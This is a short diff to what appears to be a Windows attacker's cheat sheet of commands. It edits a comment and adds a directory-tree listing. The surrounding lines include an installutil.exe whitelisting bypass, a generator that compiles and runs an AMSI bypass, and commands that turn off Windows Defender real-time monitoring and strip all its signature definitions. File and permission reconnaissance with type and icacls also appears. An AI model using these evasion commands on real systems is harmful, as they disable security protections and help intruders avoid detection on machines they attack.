@@ -9,7 +9,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogTo
 # offline bypass amsi generator
 sudo mcs /opt/win/AMSIFailGenerator.cs && sudo mono /opt/win/AMSIFailGenerator.exe
 
-# disable defender
+# disable defender antivirus
 Set-MpPreference -DisableRealtimeMonitoring $true
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
@@ -21,3 +21,6 @@ type c:\Windows\System32\Drivers\etc\hosts
 
 # permissions
 icacls C:\<PATH>
+
+# tree
+tree /F
